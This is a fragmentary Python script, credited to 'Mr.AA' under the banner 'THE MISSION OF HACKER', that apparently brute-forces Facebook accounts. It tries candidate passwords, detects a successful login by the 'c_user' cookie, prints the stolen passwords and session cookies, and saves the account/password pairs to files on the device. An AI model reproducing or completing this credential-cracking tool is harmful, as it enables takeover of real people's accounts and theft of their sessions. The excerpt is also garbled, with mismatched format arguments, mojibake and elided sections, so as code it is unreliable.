...
AUTHOR    : MD.ATIK HASAN SOJEEB (Mr.AA)

FACEBOOK : ATIK HASAN SOJEEB

VERSION    : 1.1

                                   [THE MISSION OF HACKER]
...
def checks(oks,cps,twf):
    ...
    if len(cps) != 0:
        ...
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mMr.AA-OK.txt' % (

            H, P, str(len(oks))))

        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKB-Mr.Atik.txt' %

              (H, P, str(len(cps))))

        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mMr.471K-2F.txt' %
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[âˆš]---------------------[Mr.AA-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')

                cek_apk(session,coki)

                open('/sdcard/Mr.AA-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r{Red}[Ã—]--------------------[Mr.AA-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')

                open('/sdcard/Mr.AA-CP.txt', 'a').write(cid+' | '+ps+'\n')
